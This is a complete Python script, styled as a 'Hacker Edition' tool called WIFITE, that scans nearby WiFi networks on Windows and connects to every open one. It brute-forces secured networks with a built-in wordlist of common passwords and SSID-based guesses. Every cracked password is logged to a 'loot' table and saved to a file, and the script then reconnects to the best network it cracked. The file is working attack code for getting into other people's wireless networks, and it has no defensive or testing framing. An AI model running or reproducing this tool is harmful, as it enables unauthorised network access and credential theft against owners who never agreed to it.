"""
██╗    ██╗██╗███████╗██╗████████╗███████╗
██║    ██║██║██╔════╝██║╚══██╔══╝██╔════╝
██║ █╗ ██║██║█████╗  ██║   ██║   █████╗
██║███╗██║██║██╔══╝  ██║   ██║   ██╔══╝
╚███╔███╔╝██║██║     ██║   ██║   ███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝

WiFi Auto-Connect Tool — Hacker Edition
Scans all nearby WiFi, tries every network with common passwords,
and reports ALL cracked networks in a final loot table.

Usage (run as Administrator):
    python wifi_connect.py
    python wifi_connect.py --open-only
    python wifi_connect.py --target "CafeWiFi"
    python wifi_connect.py --extra-passwords passwords.txt
"""

import subprocess
import sys
import time
import os
import random
import argparse
import tempfile
from datetime import datetime

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.live import Live
    from rich.layout import Layout
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    from rich.style import Style
    from rich.rule import Rule
    import pyfiglet
except ImportError:
    print("[!] Missing dependencies. Run: pip install rich pyfiglet")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ═══════════════════════════════════════════════════════════════════════════════

console = Console()

# Color palette — hacker green theme
NEON      = "bright_green"
DIM       = "green"
CYAN_B    = "bright_cyan"
RED       = "bright_red"
YELLOW    = "bright_yellow"
WHITE     = "bright_white"
GREY      = "grey50"
MAGENTA   = "bright_magenta"

# ─── Common passwords that public WiFi hotspots tend to use ───────────────────
COMMON_PASSWORDS = [
    # Numeric
    "12345678", "123456789", "1234567890", "00000000", "11111111",'11223344'
    "88888888", "99999999", "12341234", "11112222", "00001111",
    # Words
    "password", "password1", "password123", "wifi1234", "wifi12345",
    "wifipassword", "internet", "internet1", "wireless", "welcome1",
    "guest1234", "guestwifi", "freewifi", "publicwifi", "hotspot1",
    "connect1", "access1234", "changeme", "letmein1", "admin1234",
    "admin123", "cafewifi", "coffeeshop", "restaurant", "hotel1234",
    "hotelwifi",
    # Qwerty patterns
    "qwerty123", "qwerty1234", "asdf1234", "abcdefgh", "abcd1234",
    # Short common (WPA min = 8 chars)
    "thankYou", "iloveyou", "trustno1", "sunshine", "whatever",
    "football", "baseball", "dragon12", "master12", "monkey12",
    "shadow12", "michael1",
]


# ═══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def run_cmd(cmd: str, timeout: int = 30) -> str:
    """Run a shell command and return stdout."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, shell=True,
            encoding="utf-8", errors="replace",
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return ""


def signal_bars(pct: int) -> str:
    """Convert signal percentage to a visual bar."""
    filled = pct // 10
    empty  = 10 - filled
    if pct >= 70:
        color = NEON
    elif pct >= 40:
        color = YELLOW
    else:
        color = RED
    return f"[{color}]{'█' * filled}[/{color}][{GREY}]{'░' * empty}[/{GREY}] {pct}%"


def lock_icon(auth: str) -> str:
    """Return a styled lock/unlock indicator."""
    if "Open" in auth:
        return f"[{NEON}]🔓 OPEN[/{NEON}]"
    elif "WPA3" in auth:
        return f"[{RED}]🔒 WPA3[/{RED}]"
    elif "WPA2" in auth:
        return f"[{YELLOW}]🔒 WPA2[/{YELLOW}]"
    elif "WPA" in auth:
        return f"[{YELLOW}]🔒 WPA [/{YELLOW}]"
    else:
        return f"[{GREY}]🔒 {auth[:8]}[/{GREY}]"


def encryption_badge(enc: str) -> str:
    """Styled encryption type."""
    if enc == "CCMP":
        return f"[{CYAN_B}]AES-CCMP[/{CYAN_B}]"
    elif enc == "TKIP":
        return f"[{YELLOW}]TKIP[/{YELLOW}]"
    elif "None" in enc or not enc:
        return f"[{DIM}]None[/{DIM}]"
    return f"[{GREY}]{enc}[/{GREY}]"


def matrix_rain_line(width: int = 60) -> str:
    """Generate a single line of matrix-style characters."""
    chars = "ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789"
    return "".join(random.choice(chars) for _ in range(width))


# ═══════════════════════════════════════════════════════════════════════════════
#  BANNER & UI
# ═══════════════════════════════════════════════════════════════════════════════

def show_banner():
    """Display the epic hacker banner."""
    console.print()

    # Matrix rain header
    for _ in range(3):
        line = matrix_rain_line(70)
        console.print(f"  [green]{line}[/green]")
        time.sleep(0.05)

    # Main title
    fig_text = pyfiglet.figlet_format("WIFITE", font="ansi_shadow")
    for line in fig_text.splitlines():
        console.print(f"  [{NEON}]{line}[/{NEON}]")
        time.sleep(0.02)

    # Subtitle
    subtitle = Text()
    subtitle.append("  ◄ ", style=CYAN_B)
    subtitle.append("WiFi Auto-Connect Tool", style=f"bold {WHITE}")
    subtitle.append(" — ", style=GREY)
    subtitle.append("Hacker Edition v2.0", style=f"bold {NEON}")
    subtitle.append(" ►  ", style=CYAN_B)
    console.print(subtitle)

    # Info box
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info_lines = [
        f"[{CYAN_B}]  ┌─ System Info ──────────────────────────────────┐[/{CYAN_B}]",
        f"[{CYAN_B}]  │[/{CYAN_B}]  [{DIM}]Time    :[/{DIM}] [{WHITE}]{now}[/{WHITE}]            [{CYAN_B}]│[/{CYAN_B}]",
        f"[{CYAN_B}]  │[/{CYAN_B}]  [{DIM}]OS      :[/{DIM}] [{WHITE}]Windows[/{WHITE}]                        [{CYAN_B}]│[/{CYAN_B}]",
        f"[{CYAN_B}]  │[/{CYAN_B}]  [{DIM}]Mode    :[/{DIM}] [{NEON}]Full Scan + Brute[/{NEON}]               [{CYAN_B}]│[/{CYAN_B}]",
        f"[{CYAN_B}]  │[/{CYAN_B}]  [{DIM}]Payloads:[/{DIM}] [{NEON}]{len(COMMON_PASSWORDS)} common passwords[/{NEON}]              [{CYAN_B}]│[/{CYAN_B}]",
        f"[{CYAN_B}]  └──────────────────────────────────────────────────┘[/{CYAN_B}]",
    ]
    for l in info_lines:
        console.print(l)

    # More matrix rain
    for _ in range(2):
        line = matrix_rain_line(70)
        console.print(f"  [green]{line}[/green]")
        time.sleep(0.05)

    console.print()


def show_scan_animation():
    """Animated scanning effect."""
    frames = [
        "◜ Initializing wireless adapter ...",
        "◠ Switching to monitor mode ...",
        "◝ Sending probe requests ...",
        "◞ Capturing beacon frames ...",
        "◡ Decoding SSID information ...",
        "◟ Analyzing signal strength ...",
        "◜ Mapping access points ...",
        "◠ Building target list ...",
    ]
    for frame in frames:
        console.print(f"  [{DIM}]{frame}[/{DIM}]", end="\r")
        time.sleep(0.25)
    console.print(f"  [{NEON}]✓ Scan complete — targets acquired.                    [/{NEON}]")
    console.print()


def display_networks_table(networks: list[dict]) -> Table:
    """Create the hacker-style network table."""
    table = Table(
        title=f"[bold {NEON}]📡 DETECTED ACCESS POINTS[/bold {NEON}]",
        box=box.DOUBLE_EDGE,
        border_style=DIM,
        title_style=f"bold {NEON}",
        header_style=f"bold {CYAN_B}",
        row_styles=[f"on grey7", ""],
        padding=(0, 1),
        expand=True,
    )

    table.add_column("#", style=GREY, justify="center", width=4)
    table.add_column("SSID", style=f"bold {WHITE}", min_width=20)
    table.add_column("SIGNAL", justify="center", min_width=18)
    table.add_column("SECURITY", justify="center", min_width=12)
    table.add_column("ENCRYPTION", justify="center", min_width=12)
    table.add_column("STATUS", justify="center", min_width=10)

    for i, net in enumerate(networks, 1):
        is_open = "Open" in net["auth"]
        status = f"[{NEON}]● TARGET[/{NEON}]" if is_open else f"[{YELLOW}]● LOCKED[/{YELLOW}]"
        table.add_row(
            str(i),
            net["ssid"] if net["ssid"] else f"[{GREY}]<hidden>[/{GREY}]",
            signal_bars(net["signal"]),
            lock_icon(net["auth"]),
            encryption_badge(net["encryption"]),
            status,
        )

    return table


def show_attack_header(ssid: str, auth: str, signal: int, net_num: int, total: int, cracked_so_far: int = 0):
    """Show a styled header when attacking a network."""
    console.print()
    console.print(Rule(style=CYAN_B))

    remaining = total - net_num
    header = Panel(
        Align.center(
            Text.from_markup(
                f"[bold {WHITE}]🎯 TARGET [{net_num}/{total}][/bold {WHITE}]"
                f"    [{GREY}]|  Remaining: {remaining}  |  Cracked so far: {cracked_so_far}[/{GREY}]\n\n"
                f"[bold {NEON}]SSID:[/bold {NEON}] [{WHITE}]{ssid}[/{WHITE}]\n"
                f"[bold {NEON}]Auth:[/bold {NEON}] {lock_icon(auth)}\n"
                f"[bold {NEON}]Signal:[/bold {NEON}] {signal_bars(signal)}"
            )
        ),
        border_style=NEON,
        box=box.HEAVY,
        padding=(1, 3),
    )
    console.print(header)


def show_next_target_banner(current_ssid: str, remaining: int):
    """Big visible banner showing we're moving on to the next target."""
    if remaining > 0:
        console.print()
        console.print(f"  [{CYAN_B}]╔══════════════════════════════════════════════════╗[/{CYAN_B}]")
        console.print(f"  [{CYAN_B}]║[/{CYAN_B}]  [{YELLOW}]⚡ DONE WITH '{current_ssid}'[/{YELLOW}]")
        console.print(f"  [{CYAN_B}]║[/{CYAN_B}]  [{WHITE}]➤  Moving to next target … ({remaining} left)[/{WHITE}]")
        console.print(f"  [{CYAN_B}]╚══════════════════════════════════════════════════╝[/{CYAN_B}]")
        time.sleep(0.5)
    else:
        console.print()
        console.print(f"  [{CYAN_B}]╔══════════════════════════════════════════════════╗[/{CYAN_B}]")
        console.print(f"  [{CYAN_B}]║[/{CYAN_B}]  [{NEON}]✓ ALL TARGETS EXHAUSTED — scan complete![/{NEON}]")
        console.print(f"  [{CYAN_B}]╚══════════════════════════════════════════════════╝[/{CYAN_B}]")


def show_loot_table(loot: list[dict]):
    """Display the final results — all cracked networks."""
    console.print()

    # Epic header
    fig = pyfiglet.figlet_format("LOOT", font="ansi_shadow")
    for line in fig.splitlines():
        console.print(f"  [{NEON}]{line}[/{NEON}]")

    if not loot:
        panel = Panel(
            Align.center(
                Text.from_markup(
                    f"[bold {RED}]✘ NO NETWORKS CRACKED[/bold {RED}]\n\n"
                    f"[{GREY}]Try moving closer to access points or adding more passwords[/{GREY}]\n"
                    f"[{GREY}]Use: --extra-passwords yourlist.txt[/{GREY}]"
                )
            ),
            border_style=RED,
            box=box.HEAVY,
            padding=(1, 2),
        )
        console.print(panel)
        return

    table = Table(
        title=f"[bold {NEON}]🏆 CRACKED NETWORKS[/bold {NEON}]",
        box=box.DOUBLE_EDGE,
        border_style=NEON,
        title_style=f"bold {NEON}",
        header_style=f"bold {CYAN_B}",
        padding=(0, 1),
        expand=True,
    )

    table.add_column("#", style=GREY, justify="center", width=4)
    table.add_column("SSID", style=f"bold {WHITE}", min_width=20)
    table.add_column("PASSWORD", style=f"bold {NEON}", min_width=18)
    table.add_column("SECURITY", justify="center", min_width=12)
    table.add_column("SIGNAL", justify="center", min_width=18)
    table.add_column("INTERNET", justify="center", min_width=10)

    for i, entry in enumerate(loot, 1):
        pw_display = entry["password"] if entry["password"] else f"[{DIM}]<none/open>[/{DIM}]"
        inet = f"[{NEON}]✓ YES[/{NEON}]" if entry["internet"] else f"[{YELLOW}]✗ NO[/{YELLOW}]"
        table.add_row(
            str(i),
            entry["ssid"],
            pw_display,
            lock_icon(entry["auth"]),
            signal_bars(entry["signal"]),
            inet,
        )

    console.print(table)

    # Summary stats
    total = len(loot)
    with_inet = sum(1 for e in loot if e["internet"])
    console.print()
    console.print(f"  [{NEON}]╔══════════════════════════════════════════╗[/{NEON}]")
    console.print(f"  [{NEON}]║[/{NEON}]  [{WHITE}]Networks Cracked :[/{WHITE}]  [{NEON}]{total:>3}[/{NEON}]                 [{NEON}]║[/{NEON}]")
    console.print(f"  [{NEON}]║[/{NEON}]  [{WHITE}]With Internet    :[/{WHITE}]  [{NEON}]{with_inet:>3}[/{NEON}]                 [{NEON}]║[/{NEON}]")
    console.print(f"  [{NEON}]╚══════════════════════════════════════════╝[/{NEON}]")

    # Save loot to file
    loot_path = os.path.join(os.path.dirname(__file__), "cracked_networks.txt")
    with open(loot_path, "w", encoding="utf-8") as f:
        f.write(f"WIFITE — Cracked Networks — {datetime.now()}\n")
        f.write("=" * 60 + "\n\n")
        for entry in loot:
            f.write(f"SSID     : {entry['ssid']}\n")
            f.write(f"Password : {entry['password'] or '<open>'}\n")
            f.write(f"Auth     : {entry['auth']}\n")
            f.write(f"Signal   : {entry['signal']}%\n")
            f.write(f"Internet : {'Yes' if entry['internet'] else 'No'}\n")
            f.write("-" * 40 + "\n")

    console.print(f"\n  [{DIM}]💾 Loot saved to: {loot_path}[/{DIM}]")


# ═══════════════════════════════════════════════════════════════════════════════
#  SCAN
# ═══════════════════════════════════════════════════════════════════════════════

def scan_networks() -> list[dict]:
    """Return a list of visible WiFi networks."""
    # Force a fresh scan so we don't get stale cached results
    run_cmd("netsh wlan scan", timeout=5)
    time.sleep(3)  # give the adapter a moment to collect beacons
    output = run_cmd("netsh wlan show networks mode=bssid")
    if not output:
        return []

    networks: list[dict] = []
    current: dict = {}

    for line in output.splitlines():
        line = line.strip()
        if line.startswith("SSID") and "BSSID" not in line:
            if current.get("ssid"):
                networks.append(current)
            ssid = line.split(":", 1)[1].strip()
            current = {"ssid": ssid, "auth": "", "encryption": "", "signal": 0}
        elif line.startswith("Authentication"):
            current["auth"] = line.split(":", 1)[1].strip()
        elif line.startswith("Encryption"):
            current["encryption"] = line.split(":", 1)[1].strip()
        elif line.startswith("Signal"):
            pct = line.split(":", 1)[1].strip().replace("%", "")
            try:
                current["signal"] = int(pct)
            except ValueError:
                current["signal"] = 0

    if current.get("ssid"):
        networks.append(current)

    # De-duplicate by SSID (keep strongest signal)
    seen: dict[str, dict] = {}
    for net in networks:
        ssid = net["ssid"]
        if ssid and (ssid not in seen or net["signal"] > seen[ssid]["signal"]):
            seen[ssid] = net

    return sorted(seen.values(), key=lambda n: n["signal"], reverse=True)


# ═══════════════════════════════════════════════════════════════════════════════
#  CONNECT
# ═══════════════════════════════════════════════════════════════════════════════

def _create_profile_xml(ssid: str, password: str | None, auth: str) -> str:
    """Build a WLAN profile XML for netsh."""
    is_open = password is None

    if is_open:
        return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID><name>{ssid}</name></SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>open</authentication>
                <encryption>none</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
        </security>
    </MSM>
</WLANProfile>"""
    else:
        if "WPA2" in auth and "Personal" in auth:
            auth_type, enc_type = "WPA2PSK", "AES"
        elif "WPA" in auth and "Personal" in auth:
            auth_type, enc_type = "WPAPSK", "TKIP"
        elif "WPA3" in auth:
            auth_type, enc_type = "WPA3SAE", "AES"
        else:
            auth_type, enc_type = "WPA2PSK", "AES"

        return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID><name>{ssid}</name></SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>{auth_type}</authentication>
                <encryption>{enc_type}</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""


def _add_and_connect(ssid: str, profile_xml: str) -> bool:
    """Write a temp profile, add it, and attempt connection."""
    tmp_path = os.path.join(tempfile.gettempdir(), "wifite_profile.xml")

    with open(tmp_path, "w", encoding="utf-8") as f:
        f.write(profile_xml)

    run_cmd(f'netsh wlan delete profile name="{ssid}" 2>nul')

    add_out = run_cmd(f'netsh wlan add profile filename="{tmp_path}"')
    if "is added" not in add_out and "added on" not in add_out.lower():
        try:
            os.remove(tmp_path)
        except OSError:
            pass
        return False

    run_cmd(f'netsh wlan connect name="{ssid}"', timeout=10)
    time.sleep(4)

    state_out = run_cmd("netsh wlan show interfaces")
    connected_ssid = ""
    state = ""
    for line in state_out.splitlines():
        line = line.strip()
        if line.startswith("SSID") and "BSSID" not in line:
            connected_ssid = line.split(":", 1)[1].strip()
        if line.startswith("State"):
            state = line.split(":", 1)[1].strip()

    try:
        os.remove(tmp_path)
    except OSError:
        pass

    return state == "connected" and connected_ssid == ssid


def try_open_connect(ssid: str) -> bool:
    xml = _create_profile_xml(ssid, None, "Open")
    return _add_and_connect(ssid, xml)


def try_password_connect(ssid: str, password: str, auth: str) -> bool:
    xml = _create_profile_xml(ssid, password, auth)
    return _add_and_connect(ssid, xml)


def has_internet() -> bool:
    out = run_cmd("ping -n 1 -w 2000 8.8.8.8", timeout=8)
    return "TTL=" in out


def _generate_ssid_passwords(ssid: str) -> list[str]:
    extras = []
    cleaned = ssid.replace(" ", "").lower()
    if len(cleaned) >= 8:
        extras.append(cleaned)
        extras.append(cleaned + "123")
        extras.append(cleaned + "1234")
        extras.append(cleaned + "wifi")
    extras.append(ssid.replace(" ", "") + "123")
    extras.append(ssid.replace(" ", "") + "1234")
    return [p for p in extras if len(p) >= 8]


def disconnect_current():
    """Disconnect from current network so we can try the next one."""
    run_cmd("netsh wlan disconnect")
    time.sleep(1)


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN ATTACK LOOP — Tries ALL networks, never stops early
# ═══════════════════════════════════════════════════════════════════════════════

def attack_all(networks: list[dict], open_only: bool = False) -> list[dict]:
    """
    Walk through EVERY network. Returns a list of all cracked entries:
      {"ssid": ..., "password": ..., "auth": ..., "signal": ..., "internet": bool}
    """
    loot: list[dict] = []
    total = len(networks)

    open_nets     = [n for n in networks if "Open" in n["auth"]]
    secured_nets  = [n for n in networks if "Open" not in n["auth"]]

    net_counter = 0

    # ── Phase 1: Open networks ────────────────────────────────────────────
    if open_nets:
        console.print(Panel(
            f"[bold {NEON}]  ⚡ PHASE 1 — OPEN NETWORKS ({len(open_nets)} targets)[/bold {NEON}]",
            border_style=CYAN_B, box=box.HEAVY,
        ))

        for net in open_nets:
            net_counter += 1
            ssid = net["ssid"]
            show_attack_header(ssid, net["auth"], net["signal"], net_counter, total, len(loot))

            console.print(f"  [{DIM}]Attempting open connection …[/{DIM}]")

            with Progress(
                SpinnerColumn("dots", style=NEON),
                TextColumn(f"[{NEON}]Connecting to {{task.description}}[/{NEON}]"),
                BarColumn(bar_width=30, style=DIM, complete_style=NEON),
                TimeElapsedColumn(),
                console=console, transient=True,
            ) as progress:
                task = progress.add_task(ssid, total=100)
                for i in range(100):
                    time.sleep(0.03)
                    progress.update(task, advance=1)

            if try_open_connect(ssid):
                inet = has_internet()
                loot.append({
                    "ssid": ssid, "password": None,
                    "auth": net["auth"], "signal": net["signal"],
                    "internet": inet,
                })
                inet_str = f"[{NEON}]🌐 Internet: YES[/{NEON}]" if inet else f"[{YELLOW}]⚠ Internet: NO (captive portal?)[/{YELLOW}]"
                console.print(f"  [{NEON}]█████████████████████████████████████████[/{NEON}]")
                console.print(f"  [{NEON}]██  ✅ CRACKED — Open Network!        ██[/{NEON}]")
                console.print(f"  [{NEON}]█████████████████████████████████████████[/{NEON}]")
                console.print(f"  {inet_str}")

                # Disconnect and CONTINUE to next target — never stop!
                disconnect_current()
            else:
                console.print(f"  [{RED}]✗ Connection failed[/{RED}]")

            # Always show we're moving on
            show_next_target_banner(ssid, total - net_counter)
    else:
        console.print(f"  [{GREY}]No open networks detected.[/{GREY}]")

    # ── Phase 2: Secured networks ─────────────────────────────────────────
    if open_only:
        console.print(f"\n  [{GREY}]--open-only mode: skipping secured networks.[/{GREY}]")
        return loot

    if secured_nets:
        console.print()
        console.print(Panel(
            f"[bold {NEON}]  🔓 PHASE 2 — BRUTE-FORCE ({len(secured_nets)} targets)[/bold {NEON}]",
            border_style=MAGENTA, box=box.HEAVY,
        ))

        for net in secured_nets:
            net_counter += 1
            ssid   = net["ssid"]
            auth   = net["auth"]
            signal = net["signal"]

            show_attack_header(ssid, auth, signal, net_counter, total, len(loot))

            if signal < 15:
                console.print(f"  [{GREY}]⏭  Signal too weak — skipping.[/{GREY}]")
                show_next_target_banner(ssid, total - net_counter)
                continue

            # Build password list
            passwords = _generate_ssid_passwords(ssid) + COMMON_PASSWORDS
            seen_pw: set[str] = set()
            unique_passwords: list[str] = []
            for pw in passwords:
                if pw not in seen_pw:
                    seen_pw.add(pw)
                    unique_passwords.append(pw)

            cracked = False

            with Progress(
                SpinnerColumn("dots", style=NEON),
                TextColumn(f"[{CYAN_B}]Brute-forcing[/{CYAN_B}]"),
                BarColumn(bar_width=30, style=DIM, complete_style=NEON, finished_style=NEON),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn(f"[{GREY}]•[/{GREY}]"),
                TextColumn(f"[{DIM}]{{task.description}}[/{DIM}]"),
                TimeElapsedColumn(),
                console=console,
            ) as progress:
                task = progress.add_task(
                    f"starting …",
                    total=len(unique_passwords),
                )

                for idx, pw in enumerate(unique_passwords):
                    masked = pw[:3] + "*" * (len(pw) - 3)
                    progress.update(task, description=f"trying: {masked}")

                    if try_password_connect(ssid, pw, auth):
                        progress.update(task, completed=len(unique_passwords),
                                        description=f"[bold {NEON}]CRACKED: {pw}[/bold {NEON}]")
                        inet = has_internet()
                        loot.append({
                            "ssid": ssid, "password": pw,
                            "auth": auth, "signal": signal,
                            "internet": inet,
                        })
                        inet_str = (
                            f"[{NEON}]🌐 Internet: YES[/{NEON}]"
                            if inet else
                            f"[{YELLOW}]⚠ Internet: NO[/{YELLOW}]"
                        )
                        console.print()
                        console.print(f"  [{NEON}]█████████████████████████████████████████[/{NEON}]")
                        console.print(f"  [{NEON}]██  ✅ CRACKED!                       ██[/{NEON}]")
                        console.print(f"  [{NEON}]██  Password: {pw:<26}██[/{NEON}]")
                        console.print(f"  [{NEON}]█████████████████████████████████████████[/{NEON}]")
                        console.print(f"  {inet_str}")

                        # Disconnect and CONTINUE — never stop!
                        disconnect_current()
                        cracked = True
                        break
                    else:
                        progress.advance(task)

            if not cracked:
                console.print(f"  [{RED}]✗ No password worked for '{ssid}'[/{RED}]")

            # Always show we're moving on to next target
            show_next_target_banner(ssid, total - net_counter)

    return loot


# ═══════════════════════════════════════════════════════════════════════════════
#  RECONNECT TO BEST CRACKED NETWORK
# ═══════════════════════════════════════════════════════════════════════════════

def reconnect_best(loot: list[dict]):
    """After scanning all, reconnect to the best cracked network (strongest with internet)."""
    if not loot:
        return

    # Prefer networks with internet, then by signal strength
    best = sorted(loot, key=lambda e: (e["internet"], e["signal"]), reverse=True)
    pick = best[0]

    console.print()
    console.print(Panel(
        Align.center(
            Text.from_markup(
                f"[bold {CYAN_B}]🔄 RECONNECTING TO BEST NETWORK[/bold {CYAN_B}]\n\n"
                f"[bold {WHITE}]{pick['ssid']}[/bold {WHITE}]  •  "
                f"[{NEON}]{pick['password'] or '<open>'}[/{NEON}]  •  "
                f"Signal {pick['signal']}%"
            )
        ),
        border_style=CYAN_B, box=box.HEAVY, padding=(1, 2),
    ))

    if pick["password"]:
        try_password_connect(pick["ssid"], pick["password"], pick["auth"])
    else:
        try_open_connect(pick["ssid"])

    if has_internet():
        console.print(f"  [{NEON}]✓ Connected with internet access![/{NEON}]")
    else:
        console.print(f"  [{YELLOW}]⚠ Connected but no internet.[/{YELLOW}]")


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="WIFITE — Scan & auto-connect to WiFi networks (hacker edition).",
    )
    parser.add_argument("--open-only", action="store_true",
                        help="Only try open (no-password) networks")
    parser.add_argument("--target", type=str, default=None,
                        help="Only try a specific SSID")
    parser.add_argument("--extra-passwords", type=str, default=None,
                        help="Path to a text file with extra passwords (one per line)")
    parser.add_argument("--no-reconnect", action="store_true",
                        help="Don't auto-reconnect to best network at end")
    args = parser.parse_args()

    # ── Load extra passwords ──
    if args.extra_passwords:
        try:
            with open(args.extra_passwords, "r") as f:
                extras = [line.strip() for line in f if line.strip() and len(line.strip()) >= 8]
            COMMON_PASSWORDS.extend(extras)
        except FileNotFoundError:
            console.print(f"  [{RED}][!] Password file not found: {args.extra_passwords}[/{RED}]")

    # ── Banner ──
    show_banner()

    # ── Scan ──
    show_scan_animation()
    networks = scan_networks()

    if not networks:
        console.print(Panel(
            f"[bold {RED}]  ✘ No WiFi networks found. Is your adapter enabled?[/bold {RED}]",
            border_style=RED, box=box.HEAVY,
        ))
        sys.exit(1)

    console.print(f"  [{NEON}]▶ Detected {len(networks)} unique access point(s)[/{NEON}]\n")
    console.print(display_networks_table(networks))

    # ── Filter ──
    if args.target:
        networks = [n for n in networks if n["ssid"].lower() == args.target.lower()]
        if not networks:
            console.print(f"  [{RED}]Target '{args.target}' not found.[/{RED}]")
            sys.exit(1)
        console.print(f"  [{CYAN_B}]🎯 Locked on target: {args.target}[/{CYAN_B}]\n")

    # ── Attack all ──
    loot = attack_all(networks, open_only=args.open_only)

    # ── Show final loot table ──
    show_loot_table(loot)

    # ── Reconnect to best ──
    if not args.no_reconnect and loot:
        reconnect_best(loot)

    # Footer
    console.print()
    for _ in range(3):
        line = matrix_rain_line(70)
        console.print(f"  [green]{line}[/green]")
    console.print(f"\n  [{DIM}]Session ended at {datetime.now().strftime('%H:%M:%S')}[/{DIM}]\n")


if __name__ == "__main__":
    main()
